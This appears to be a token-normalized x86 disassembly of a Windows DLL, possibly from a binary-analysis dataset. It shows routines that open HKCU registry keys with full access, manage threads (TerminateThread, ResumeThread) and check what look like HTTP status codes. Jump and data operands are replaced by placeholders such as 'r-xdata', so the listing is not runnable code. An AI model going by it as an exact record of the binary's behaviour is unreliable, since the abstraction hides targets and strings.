lea ecx [ esp + 0x48 ]
call sub_10001500
push ebx
push 0x1
lea ecx [ esp + 0x2c ]
call sub_10001500
push ebx
lea ecx [ esp + 0x60 ]
mov [ esp + 0x78 ] 0xf
call sub_10002004
lea eax [ esp + 0x5c ]
push eax
push [ esp + 0x20 ]
lea eax [ esp + 0x1c ]
push eax
lea ecx [ esi + 0x74 ]
push esi
mov [ esp + 0x98 ] 0x5
call sub_100141b7
push [ esp + 0x20 ]
lea eax [ esp + 0x60 ]
lea ecx [ esi + 0x4 ]
push eax
call sub_100145a2
pop ecx
pop ecx
push ebx
push 0x1
lea ecx [ esp + 0x64 ]
call sub_10002020
lea ecx [ esp + 0x14 ]
mov [ esp + 0x14 ] edi
call sub_100188a2
mov ecx [ esp + 0x80 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x68 ]
xor ecx esp
call sub_100242d7
mov esp ebp
pop ebp
retn 0x8
sub_100141b7
push 0x204
mov eax sub_1004f2a6
call sub_1002826c
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x94 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x84 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x98 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x9c ] eax
lea eax [ ebp - 0x8c ]
mov esi ecx
push eax
mov eax esi
mov [ ebp - 0x8c ] 0x2f
call sub_1001473f
mov [ ebp - 0x8c ] eax
cmp eax 0xffffffff
jne r-xdata
push eax
xor edi edi
push edi
lea eax [ ebp - 0x64 ]
push eax
mov ecx esi
call sub_10004622
xor ebx ebx
inc ebx
mov [ ebp - 0x4 ] ebx
mov eax [ esi + 0x14 ]
mov ecx [ ebp - 0x8c ]
sub eax ecx
dec eax
push eax
inc ecx
push ecx
lea eax [ ebp - 0x48 ]
push eax
mov ecx esi
call sub_10004622
mov esi r--data
push esi
lea ecx [ ebp - 0xd4 ]
mov [ ebp - 0x4 ] 0x2
call sub_1000134a
push esi
lea ecx [ ebp - 0xb8 ]
mov [ ebp - 0x4 ] 0x3
call sub_1000134a
lea eax [ ebp - 0xd4 ]
push eax
mov [ ebp - 0x4 ] 0x4
push [ ebp - 0x84 ]
lea edx [ ebp - 0xb8 ]
lea ecx [ ebp - 0x64 ]
call sub_100185b7
pop ecx
pop ecx
lea ecx [ ebp - 0x90 ]
push ecx
mov ecx eax
call sub_10018837
mov [ ebp - 0x90 ] r--data
push edi
push ebx
lea ecx [ ebp - 0xb8 ]
call sub_10001500
push edi
push ebx
lea ecx [ ebp - 0xd4 ]
mov [ ebp - 0x4 ] 0x7
call sub_10001500
mov eax [ ebp - 0x94 ]
add eax 0x20
push eax
lea eax [ ebp - 0x10c ]
push r--data
push eax
call sub_10010c73
add esp 0xc
push r--data
push eax
lea eax [ ebp - 0x188 ]
push eax
mov [ ebp - 0x4 ] 0x8
call sub_10004ab3
add esp 0xc
mov ecx [ ebp - 0x94 ]
add ecx 0x90
mov [ ebp - 0x4 ] 0x9
push ecx
push eax
lea eax [ ebp - 0x80 ]
push eax
call sub_10010cbe
add esp 0xc
push edi
push ebx
lea ecx [ ebp - 0x188 ]
call sub_10001500
push edi
push ebx
lea ecx [ ebp - 0x10c ]
mov [ ebp - 0x4 ] 0xc
call sub_10001500
push esi
lea ecx [ ebp - 0xf0 ]
call sub_1000134a
push esi
lea ecx [ ebp - 0x128 ]
mov [ ebp - 0x4 ] 0xd
call sub_1000134a
push esi
lea ecx [ ebp - 0xb8 ]
mov [ ebp - 0x4 ] 0xe
call sub_1000134a
push r--data
lea ecx [ ebp - 0xd4 ]
mov [ ebp - 0x4 ] 0xf
call sub_1000134a
push r--data
lea eax [ ebp - 0x48 ]
push eax
lea eax [ ebp - 0x144 ]
push eax
mov [ ebp - 0x4 ] 0x10
call sub_10004ab3
add esp 0xc
lea ecx [ ebp - 0x80 ]
push ecx
push eax
lea eax [ ebp - 0x16c ]
push eax
mov [ ebp - 0x4 ] 0x11
call sub_10010cbe
add esp 0xc
lea ecx [ ebp - 0xf0 ]
push ecx
lea ecx [ ebp - 0x128 ]
push ecx
lea ecx [ ebp - 0xb8 ]
push ecx
lea ecx [ ebp - 0x90 ]
push ecx
mov ecx eax
lea edx [ ebp - 0xd4 ]
mov [ ebp - 0x4 ] 0x12
call sub_10018662
add esp 0x10
lea ecx [ ebp - 0x88 ]
push ecx
mov ecx eax
call sub_10018837
mov esi r--data
mov [ ebp - 0x88 ] esi
push edi
push ebx
lea ecx [ ebp - 0x16c ]
call sub_10001500
push edi
push ebx
lea ecx [ ebp - 0x144 ]
call sub_10001500
push edi
push ebx
lea ecx [ ebp - 0xd4 ]
call sub_10001500
push edi
push ebx
lea ecx [ ebp - 0xb8 ]
call sub_10001500
push edi
push ebx
lea ecx [ ebp - 0x128 ]
call sub_10001500
push edi
push ebx
lea ecx [ ebp - 0xf0 ]
mov [ ebp - 0x4 ] 0x19
call sub_10001500
mov ecx [ ebp - 0x98 ]
push r--data
call sub_10014834
mov ecx [ ebp - 0x94 ]
push [ ebp - 0x98 ]
add ecx 0x3c
lea edx [ ebp - 0x88 ]
call sub_10014b25
pop ecx
lea eax [ ebp - 0x210 ]
push eax
call sub_10009682
mov [ ebp - 0x4 ] 0x1a
push edi
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x14 ] 0xf
call sub_10002004
push edi
push 0x800
lea ecx [ ebp - 0x2c ]
call sub_10007c8f
mov [ ebp - 0x4 ] 0x1b
jmp r-xdata
push r--data
lea ecx [ ebp - 0xf0 ]
call sub_10001c7f
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0xf0 ]
push eax
lea ecx [ ebp - 0x150 ]
call sub_10002075
push r--data
lea eax [ ebp - 0x150 ]
push eax
call sub_10027dd1
cmp [ ebp - 0x14 ] 0x10
mov eax [ ebp - 0x28 ]
jae r-xdata
push [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x88 ]
push eax
call sub_1001875f
cmp eax edi
ja r-xdata
lea eax [ ebp - 0x28 ]
cmp [ ebp - 0x14 ] 0x10
mov ecx [ ebp - 0x28 ]
jae r-xdata
lea ecx [ ebp - 0x10c ]
lea eax [ ebp - 0x210 ]
call sub_100097b3
mov ecx [ ebp - 0x9c ]
push 0xffffffff
push edi
push eax
mov [ ebp - 0x4 ] 0x1c
call sub_10001f30
push edi
push ebx
lea ecx [ ebp - 0x10c ]
call sub_10002020
push edi
push ebx
lea ecx [ ebp - 0x2c ]
call sub_10002020
lea eax [ ebp - 0x210 ]
mov [ ebp - 0x4 ] 0x19
call sub_10008eb7
lea ecx [ ebp - 0x88 ]
mov [ ebp - 0x88 ] esi
call sub_100188a2
push edi
push ebx
lea ecx [ ebp - 0x80 ]
call sub_10001500
lea ecx [ ebp - 0x90 ]
mov [ ebp - 0x90 ] r--data
call sub_100188a2
push edi
push ebx
lea ecx [ ebp - 0x48 ]
call sub_10001500
push edi
push ebx
lea ecx [ ebp - 0x64 ]
call sub_10001500
call sub_100282ef
retn 0x10
push eax
push ecx
lea eax [ ebp - 0x208 ]
push eax
call sub_100095cf
lea ecx [ ebp - 0x28 ]
sub_100145a2
push 0x64
mov eax sub_1004d39c
call sub_10028203
mov esi ecx
mov ecx [ ebp + 0xc ]
push r--data
call sub_10001c62
cmp [ esi + 0x18 ] 0x10
mov ecx [ esi + 0x14 ]
lea ebx [ esi + 0x4 ]
jb r-xdata
mov eax ebx
mov eax [ ebx ]
jmp r-xdata
push esi
call sub_10001fc2
add edi [ eax + 0x14 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10002020
cmp [ esi + 0x18 ] 0x10
mov eax [ esi + 0x14 ]
jb r-xdata
push r--data
call sub_10001c7f
and [ ebp - 0x4 ] 0x0
push ecx
push eax
push [ ebp + 0x8 ]
xor eax eax
call sub_100146a3
mov edi eax
lea ecx [ ebp - 0x2c ]
cmp edi 0xffffffff
jne r-xdata
push eax
push ebx
push [ ebp + 0x8 ]
lea eax [ edi - 0x1 ]
call sub_100146a3
cmp eax 0xffffffff
jne r-xdata
mov ebx [ ebx ]
cmp edi eax
jbe r-xdata
push r--data
lea ecx [ ebp - 0x2c ]
call sub_10001c7f
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
sub eax edi
push eax
push edi
push [ ebp + 0x8 ]
lea esi [ ebp - 0x48 ]
call sub_100095a1
mov ecx [ ebp + 0xc ]
push 0xffffffff
push 0x0
push eax
mov [ ebp - 0x4 ] 0x3
call sub_10001f30
push 0x0
push 0x1
mov ecx esi
call sub_10002020
call sub_100282db
retn
push r--data
lea ecx [ ebp - 0x2c ]
call sub_10001c7f
mov [ ebp - 0x4 ] 0x2
jmp r-xdata
lea eax [ ebp - 0x2c ]
push eax
lea ecx [ ebp - 0x70 ]
call sub_10002075
push r--data
lea eax [ ebp - 0x70 ]
push eax
call sub_10027dd1
sub_100146a3
push ebp
mov ebp esp
push ecx
cmp [ ebp + 0x10 ] 0x0
mov ecx [ ebp + 0x8 ]
jne r-xdata
push ebx
push esi
mov esi [ ecx + 0x14 ]
push edi
cmp eax esi
jae r-xdata
cmp eax [ ecx + 0x14 ]
jbe r-xdata
or eax 0xffffffff
sub esi eax
cmp [ ebp + 0x10 ] esi
ja r-xdata
leave
retn 0xc
xor edx edx
inc edx
sub edx [ ebp + 0x10 ]
add esi edx
cmp [ ecx + 0x18 ] 0x10
jb r-xdata
add ecx 0x4
mov [ ebp - 0x4 ] ecx
add ecx 0x4
mov [ ebp - 0x4 ] ecx
mov ecx [ ecx ]
jmp r-xdata
mov eax [ ebp + 0xc ]
movsx eax [ eax ]
push esi
push eax
push ebx
call sub_10024c40
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
lea ebx [ ecx + eax ]
jmp r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
call sub_10025882
add esp 0xc
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x18 ] 0x10
jb r-xdata
sub ebx edi
lea esi [ esi + ebx - 0x1 ]
lea ebx [ edi + 0x1 ]
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
jmp r-xdata
pop edi
pop esi
pop ebx
mov eax edi
sub eax ecx
jmp r-xdata
sub_1001473f
push ebp
mov ebp esp
mov ecx [ eax + 0x14 ]
sub esp 0xc
push ebx
push esi
push edi
test ecx ecx
jbe r-xdata
or eax 0xffffffff
cmp ecx 0x1
jb r-xdata
mov [ ebp - 0x4 ] ecx
mov ecx [ eax + 0x18 ]
add eax 0x4
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] eax
cmp ecx 0x8
jb r-xdata
mov ebx eax
mov ebx [ eax ]
jmp r-xdata
push [ ebp - 0x4 ]
push edi
push ebx
call sub_10014856
mov esi eax
add esp 0xc
test esi esi
jne r-xdata
mov eax [ ebp + 0x8 ]
movzx edi [ eax ]
jmp r-xdata
push 0x1
push [ ebp + 0x8 ]
push esi
call sub_10003398
add esp 0xc
test eax eax
je r-xdata
cmp [ ebp - 0xc ] 0x8
jb r-xdata
mov eax esi
sub eax ebx
sar eax 0x1
or ecx 0xffffffff
sub ecx eax
add [ ebp - 0x4 ] ecx
lea ebx [ esi + 0x2 ]
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x4
mov eax esi
sub eax ecx
sar eax 0x1
jmp r-xdata
sub_100147ce
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
cmp [ esi + 0x14 ] edi
jae r-xdata
mov eax [ esi + 0x14 ]
mov ebx [ ebp + 0xc ]
sub eax edi
cmp eax ebx
jae r-xdata
call sub_10022f7c
mov eax [ ebp + 0x14 ]
cmp ebx eax
jae r-xdata
mov ebx eax
cmp [ esi + 0x18 ] 0x10
jb r-xdata
mov eax ebx
add esi 0x4
mov esi [ esi + 0x4 ]
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
cmp ebx [ ebp + 0x14 ]
jae r-xdata
push eax
push [ ebp + 0x10 ]
add esi edi
push esi
call sub_10025882
add esp 0xc
test eax eax
jne r-xdata
xor eax eax
cmp ebx [ ebp + 0x14 ]
setne al
or eax 0xffffffff
jmp r-xdata
sub_10014834
push esi
push [ esp + 0x8 ]
mov esi ecx
call sub_10024630
pop ecx
push eax
push [ esp + 0xc ]
mov ecx esi
push [ esi + 0x14 ]
push 0x0
call sub_100147ce
pop esi
retn 0x4
sub_10014876
push 0xcc
mov eax sub_1004dc81
call sub_1002826c
mov esi ecx
xor ebx ebx
mov [ ebp - 0x3c ] esi
mov [ ebp - 0x40 ] ebx
call sub_10003efc
lea ecx [ esi + 0x1c ]
call sub_10003efc
xor edi edi
mov [ ebp - 0x4 ] ebx
inc edi
push r--data
lea ecx [ ebp - 0x94 ]
mov [ ebp - 0x40 ] edi
call sub_1000134a
push r--data
lea ecx [ ebp - 0xb0 ]
mov [ ebp - 0x4 ] edi
call sub_1000134a
lea eax [ ebp - 0x94 ]
push eax
push 0xf003f
lea eax [ ebp - 0xb0 ]
push eax
push 0x80000001
lea eax [ ebp - 0x38 ]
push eax
mov [ ebp - 0x4 ] 0x2
call sub_1001506f
push ebx
push edi
lea ecx [ ebp - 0xb0 ]
call sub_10001500
push ebx
push edi
lea ecx [ ebp - 0x94 ]
mov [ ebp - 0x4 ] 0x5
call sub_10001500
push r--data
lea ecx [ ebp - 0x5c ]
call sub_1000134a
lea eax [ ebp - 0x5c ]
push eax
lea eax [ ebp - 0xd8 ]
push eax
lea eax [ ebp - 0x38 ]
push eax
mov [ ebp - 0x4 ] 0x6
call sub_1001519e
lea ecx [ ebp - 0x78 ]
push ecx
push eax
mov [ ebp - 0x4 ] 0x7
call sub_1001555c
push 0xffffffff
push ebx
push eax
mov ecx esi
mov [ ebp - 0x4 ] 0x8
call sub_10001450
push ebx
push edi
lea ecx [ ebp - 0x78 ]
call sub_10001500
lea esi [ ebp - 0xd8 ]
mov [ ebp - 0x4 ] 0x6
call sub_10015514
push ebx
push edi
lea ecx [ ebp - 0x5c ]
mov [ ebp - 0x4 ] 0x5
call sub_10001500
push r--data
lea ecx [ ebp - 0x5c ]
call sub_1000134a
lea eax [ ebp - 0x5c ]
push eax
lea eax [ ebp - 0xd8 ]
push eax
lea eax [ ebp - 0x38 ]
push eax
mov [ ebp - 0x4 ] 0x9
call sub_1001519e
lea ecx [ ebp - 0x78 ]
push ecx
push eax
mov [ ebp - 0x4 ] 0xa
call sub_1001555c
push 0xffffffff
mov [ ebp - 0x4 ] 0xb
mov ecx [ ebp - 0x3c ]
push ebx
push eax
add ecx 0x1c
call sub_10001450
push ebx
push edi
lea ecx [ ebp - 0x78 ]
call sub_10001500
lea esi [ ebp - 0xd8 ]
mov [ ebp - 0x4 ] 0x9
call sub_10015514
push ebx
push edi
lea ecx [ ebp - 0x5c ]
call sub_10001500
lea ecx [ ebp - 0x38 ]
call sub_10015175
mov eax [ ebp - 0x3c ]
call sub_100282ef
retn
sub_10014a06
push 0xac
mov eax sub_1004e1ef
call sub_1002826c
mov edi ecx
push r--data
lea ecx [ ebp - 0x74 ]
call sub_1000134a
xor ebx ebx
push r--data
lea ecx [ ebp - 0x90 ]
mov [ ebp - 0x4 ] ebx
call sub_1000134a
lea eax [ ebp - 0x74 ]
push eax
push 0xf003f
lea eax [ ebp - 0x90 ]
push eax
push 0x80000001
lea eax [ ebp - 0x3c ]
push eax
mov [ ebp - 0x4 ] 0x1
call sub_1001506f
push ebx
push 0x1
lea ecx [ ebp - 0x90 ]
call sub_10001500
push ebx
push 0x1
lea ecx [ ebp - 0x74 ]
mov [ ebp - 0x4 ] 0x4
call sub_10001500
push r--data
lea ecx [ ebp - 0x58 ]
call sub_1000134a
lea eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0xb8 ]
push eax
mov [ ebp - 0x4 ] 0x5
call sub_100155dd
pop ecx
pop ecx
lea ecx [ ebp - 0x3c ]
push ecx
mov ecx eax
mov [ ebp - 0x4 ] 0x6
call sub_100153ef
lea esi [ ebp - 0xb8 ]
mov [ ebp - 0x4 ] 0x5
call sub_10015514
push ebx
push 0x1
lea ecx [ ebp - 0x58 ]
mov [ ebp - 0x4 ] 0x4
call sub_10001500
push r--data
lea ecx [ ebp - 0x58 ]
call sub_1000134a
lea eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0xb8 ]
add edi 0x1c
push eax
mov [ ebp - 0x4 ] 0x7
call sub_100155dd
pop ecx
pop ecx
lea ecx [ ebp - 0x3c ]
push ecx
mov ecx eax
mov [ ebp - 0x4 ] 0x8
call sub_100153ef
lea esi [ ebp - 0xb8 ]
mov [ ebp - 0x4 ] 0x7
call sub_10015514
push ebx
push 0x1
lea ecx [ ebp - 0x58 ]
call sub_10001500
lea ecx [ ebp - 0x3c ]
call sub_10015175
call sub_100282ef
retn
sub_10014b25
push 0x120
mov eax sub_1004ee3d
call sub_100282a2
mov eax [ ebp + 0x8 ]
mov edi edx
mov edx [ eax + 0x14 ]
xor esi esi
mov [ ebp - 0x58 ] edi
mov [ ebp - 0x60 ] ecx
mov [ ebp - 0x5c ] edx
mov [ ebp - 0x54 ] esi
cmp edx esi
je r-xdata
push edx
push [ ebp - 0x54 ]
push edi
call sub_100186f8
push edi
call sub_100187c5
mov ebx 0xc8
cmp eax ebx
je r-xdata
cmp [ eax + 0x18 ] 0x10
jb r-xdata
call sub_100282fe
retn
cmp eax 0x197
je r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
push esi
lea ecx [ ebp - 0x50 ]
mov [ ebp - 0x38 ] 0x7
call sub_100016a9
lea ecx [ ebp - 0x34 ]
call sub_10003efc
mov [ ebp - 0x4 ] 0x1
lea ecx [ ebp - 0xb4 ]
mov [ ebp - 0x4 ] 0x2
call sub_10014876
mov esi eax
push 0xffffffff
push 0x0
push esi
lea ecx [ ebp - 0x50 ]
mov [ ebp - 0x4 ] 0x3
call sub_10001450
push 0xffffffff
push 0x0
add esi 0x1c
push esi
lea ecx [ ebp - 0x34 ]
call sub_10001450
lea esi [ ebp - 0xb4 ]
call sub_100149ee
mov [ ebp - 0x4 ] 0x1
jmp sub_10014c2d
push r--data
lea ecx [ ebp - 0x7c ]
call sub_10001c7f
lea eax [ ebp - 0x7c ]
push eax
lea ecx [ ebp - 0x12c ]
mov [ ebp - 0x4 ] esi
call sub_10002075
push r--data
lea eax [ ebp - 0x12c ]
push eax
call sub_10027dd1
mov [ ebp - 0x54 ] eax
sub_10014c2d
mov esi r--data
push esi
lea ecx [ ebp - 0x34 ]
call sub_10010da6
test eax eax
je r-xdata
mov ecx edi
lea edi [ ebp - 0xb4 ]
call sub_10022c38
mov esi eax
push 0xffffffff
push 0x0
push esi
lea ecx [ ebp - 0x50 ]
mov [ ebp - 0x4 ] 0x6
call sub_10001450
push 0xffffffff
push 0x0
add esi 0x1c
push esi
lea ecx [ ebp - 0x34 ]
call sub_10001450
mov esi edi
mov [ ebp - 0x4 ] 0x1
call sub_100149ee
push [ ebp - 0x5c ]
mov ecx [ ebp - 0x60 ]
push [ ebp - 0x54 ]
push [ ebp - 0x58 ]
call sub_100186f8
push [ ebp - 0x58 ]
call sub_100187c5
cmp eax ebx
je r-xdata
push esi
lea ecx [ ebp - 0x50 ]
call sub_10010da6
test eax eax
je r-xdata
lea ecx [ ebp - 0x50 ]
call sub_10014a06
push r--data
lea ecx [ ebp - 0x98 ]
call sub_10001c7f
lea eax [ ebp - 0x98 ]
push eax
lea ecx [ ebp - 0x104 ]
mov [ ebp - 0x4 ] 0x7
call sub_10002075
push r--data
lea eax [ ebp - 0x104 ]
jmp r-xdata
cmp [ ebp - 0x38 ] 0x8
mov eax [ ebp - 0x4c ]
jae r-xdata
push eax
call sub_10027dd1
push esi
lea ecx [ ebp - 0x50 ]
mov [ ebp - 0x38 ] 0x7
call sub_100016a9
lea ecx [ ebp - 0x34 ]
call sub_10003efc
mov [ ebp - 0x4 ] 0x1
lea ecx [ ebp - 0xb4 ]
mov [ ebp - 0x4 ] 0x2
call sub_10014876
mov esi eax
push 0xffffffff
push 0x0
push esi
lea ecx [ ebp - 0x50 ]
mov [ ebp - 0x4 ] 0x3
call sub_10001450
push 0xffffffff
push 0x0
add esi 0x1c
push esi
lea ecx [ ebp - 0x34 ]
call sub_10001450
lea esi [ ebp - 0xb4 ]
call sub_100149ee
mov [ ebp - 0x4 ] 0x1
jmp sub_10014c2d
mov ecx [ ebp - 0x3c ]
add ecx ecx
push ecx
push eax
push 0x2b
push edi
call sub_100188de
cmp [ ebp - 0x1c ] 0x8
mov eax [ ebp - 0x30 ]
jae r-xdata
lea eax [ ebp - 0x4c ]
mov ecx [ ebp - 0x20 ]
add ecx ecx
push ecx
push eax
push 0x2c
push edi
call sub_100188de
push [ ebp - 0x5c ]
mov ecx [ ebp - 0x60 ]
push [ ebp - 0x54 ]
push edi
call sub_100186f8
push edi
call sub_100187c5
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x30 ]
lea esi [ ebp - 0x50 ]
call sub_100149ee
call sub_100282fe
retn
cmp eax 0x197
je r-xdata
push r--data
lea ecx [ ebp - 0x7c ]
call sub_10001c7f
lea eax [ ebp - 0x7c ]
push eax
lea ecx [ ebp - 0xdc ]
mov [ ebp - 0x4 ] 0x5
call sub_10002075
push r--data
lea eax [ ebp - 0xdc ]
jmp r-xdata
sub_10014d82
push esi
push edi
mov edi [ esp + 0xc ]
push edi
mov esi ecx
call sub_10014da3
mov [ esi ] r--data
mov eax [ edi + 0x28 ]
mov [ esi + 0x28 ] eax
pop edi
mov eax esi
pop esi
retn 0x4
sub_10014ddd
push ebp
mov ebp esp
sub esp 0x30
cmp [ ebp + 0x8 ] 0x0
push ebx
push esi
je r-xdata
pop esi
pop ebx
leave
retn
call [ GetLastError@IAT ]
test eax eax
je r-xdata
push [ ebp + 0xc ]
mov ebx eax
lea esi [ ebp - 0x2c ]
call sub_10017079
push r--data
mov eax esi
push eax
call sub_10027dd1
sub_10014e13
push 0x48
mov eax sub_1004d361
call sub_10028203
mov eax [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ eax ] r--data
mov [ eax + 0x4 ] edx
and [ ebp - 0x4 ] 0x0
mov [ eax ] r--data
mov edx [ ecx + 0x4 ]
mov [ eax + 0x8 ] edx
cmp [ ecx ] 0x0
jne r-xdata
call sub_100282db
retn 0x4
push r--data
lea ecx [ ebp - 0x2c ]
call sub_10001c7f
lea eax [ ebp - 0x2c ]
push eax
lea ecx [ ebp - 0x54 ]
mov [ ebp - 0x4 ] 0x1
call sub_10002075
push r--data
lea eax [ ebp - 0x54 ]
push eax
call sub_10027dd1
sub_10014e75
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1004e193
mov eax [ fs : 0x0 ]
push eax
sub esp 0x68
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x70 ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
push 0xffffffff
push eax
call [ WaitForSingleObject@IAT ]
push r--data
lea ecx [ esp + 0x10 ]
mov esi eax
call sub_10001c7f
and [ esp + 0x78 ] 0x0
lea eax [ esp + 0xc ]
push eax
cmp esi 0xffffffff
sete al
movzx eax al
push eax
call sub_10014ddd
or [ esp + 0x80 ] 0xffffffff
pop ecx
pop ecx
push 0x0
push 0x1
lea ecx [ esp + 0x14 ]
call sub_10002020
test esi esi
je r-xdata
mov ecx [ esp + 0x70 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push r--data
lea ecx [ esp + 0x2c ]
call sub_10001c7f
lea eax [ esp + 0x28 ]
push eax
lea ecx [ esp + 0x48 ]
mov [ esp + 0x7c ] 0x1
call sub_10002075
push r--data
lea eax [ esp + 0x48 ]
push eax
call sub_10027dd1
sub_10014f38
push 0x20
mov eax sub_1004e168
call sub_10028203
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
push 0x0
push eax
call [ TerminateThread@IAT ]
push r--data
lea ecx [ ebp - 0x28 ]
mov edi eax
call sub_10001c7f
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
test edi edi
sete al
movzx eax al
push eax
call sub_10014ddd
pop ecx
pop ecx
push 0x0
push 0x1
lea ecx [ ebp - 0x28 ]
call sub_10002020
call sub_100282db
retn 0x4
sub_10014f8e
push 0x20
mov eax sub_1004e168
call sub_10028203
mov eax [ ebp + 0x8 ]
push [ eax + 0x4 ]
call [ ResumeThread@IAT ]
push r--data
lea ecx [ ebp - 0x28 ]
mov esi eax
call sub_10001c7f
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
cmp esi 0xffffffff
sete al
movzx eax al
push eax
call sub_10014ddd
pop ecx
pop ecx
push 0x0
push 0x1
lea ecx [ ebp - 0x28 ]
call sub_10002020
call sub_100282db
retn 0x4
sub_10015045
push ebp
mov ebp esp
sub esp 0x2c
push ebx
mov ebx eax
push esi
test ebx ebx
je r-xdata
pop esi
pop ebx
leave
retn
push [ ebp + 0x8 ]
lea esi [ ebp - 0x2c ]
call sub_10017079
push r--data
mov eax esi
push eax
call sub_10027dd1
sub_1001506f
push 0x50
mov eax sub_1004dbf9
call sub_10028203
mov esi [ ebp + 0x8 ]
push [ ebp + 0x10 ]
lea edi [ esi + 0x4 ]
and [ edi ] 0x0
lea ebx [ esi + 0x8 ]
and [ ebx ] 0x0
lea ecx [ esi + 0xc ]
mov [ esi ] r--data
call sub_1000136c
mov ecx [ ebp + 0x18 ]
and [ ebp - 0x4 ] 0x0
and [ ebp - 0x14 ] 0x0
push r--data
call sub_10010da6
test eax eax
je r-xdata
mov eax [ ebp + 0x10 ]
cmp [ eax + 0x18 ] 0x8
jb r-xdata
mov eax [ ebp + 0x18 ]
cmp [ eax + 0x18 ] 0x8
jb r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
cmp [ edi ] ebx
jne r-xdata
push r--data
lea ecx [ ebp - 0x30 ]
call sub_10001c7f
mov ebx [ ebp + 0x18 ]
lea eax [ ebp - 0x30 ]
push eax
lea esi [ ebp - 0x5c ]
mov [ ebp - 0x4 ] 0x1
call sub_10017079
push r--data
mov eax esi
push ebx
push edi
xor ebx ebx
push ebx
push [ ebp + 0x14 ]
push ebx
push [ ebp - 0x14 ]
push ebx
push eax
push [ ebp + 0xc ]
call [ RegCreateKeyExW@IAT ]
mov [ ebp + 0x18 ] eax
cmp eax ebx
je r-xdata
mov [ ebp - 0x14 ] eax
mov eax esi
call sub_100282db
retn 0x14
push r--data
lea ecx [ ebp - 0x30 ]
call sub_10001c7f
lea eax [ ebp - 0x30 ]
push eax
lea ecx [ ebp - 0x58 ]
mov [ ebp - 0x4 ] 0x2
call sub_10002075
push r--data
lea eax [ ebp - 0x58 ]
jmp r-xdata
push eax
call sub_10027dd1
sub_10015175
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
mov [ esi ] r--data
test eax eax
je r-xdata
push 0x0
push 0x1
lea ecx [ esi + 0xc ]
call sub_10001500
pop esi
retn
push eax
call [ RegCloseKey@IAT ]
and [ esi + 0x4 ] 0x0
sub_1001519e
push 0x88
mov eax sub_1004dbc0
call sub_10028203
mov eax [ ebp + 0x10 ]
xor ebx ebx
mov [ ebp - 0x20 ] ebx
cmp [ eax + 0x18 ] 0x8
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
jb r-xdata
add eax 0x4
add eax 0x4
mov eax [ eax ]
jmp r-xdata
push 0x20
call sub_10024389
mov esi eax
pop ecx
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x4 ] 0x2
cmp esi ebx
je r-xdata
push r--data
lea ecx [ ebp - 0x40 ]
call sub_10001c7f
lea eax [ ebp - 0x40 ]
mov [ ebp - 0x4 ] 0x1
push eax
mov ebx esi
mov edi [ RegQueryValueExW@IAT ]
lea ecx [ ebp - 0x14 ]
push ecx
push ebx
lea ecx [ ebp - 0x10 ]
push ecx
push ebx
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0x4 ]
call edi
mov esi eax
cmp esi ebx
je r-xdata
xor esi esi
push [ ebp - 0x14 ]
call sub_10014fe2
mov esi eax
jmp r-xdata
add eax 0x8
mov eax [ eax + 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] bl
push esi
lea ecx [ ebp - 0x18 ]
mov [ ebp - 0x1c ] esi
call sub_100032f5
push esi
lea eax [ ebp - 0x1c ]
push esi
push eax
call sub_10001a27
add esp 0xc
mov [ ebp - 0x4 ] 0x3
mov eax [ ebp - 0x1c ]
cmp [ eax + 0x1c ] 0x10
jb r-xdata
lea ecx [ esi + 0x4 ]
mov ecx [ esi + 0x4 ]
jmp r-xdata
mov esi [ ebp + 0x10 ]
cmp [ esi + 0x18 ] 0x8
jb r-xdata
push esi
push ecx
push ecx
mov ecx [ ebp - 0x1c ]
mov eax esp
mov [ eax ] ecx
lea ecx [ ebp - 0x18 ]
mov [ ebp + 0x10 ] esp
push ecx
lea ecx [ eax + 0x4 ]
call sub_10003d36
push [ ebp - 0x10 ]
lea eax [ ebp - 0x94 ]
push eax
call sub_100154c1
mov [ ebp - 0x4 ] 0x5
push [ ebp + 0xc ]
mov ecx eax
call sub_10015320
lea esi [ ebp - 0x94 ]
mov [ ebp - 0x20 ] 0x1
mov [ ebp - 0x4 ] 0x3
call sub_10015514
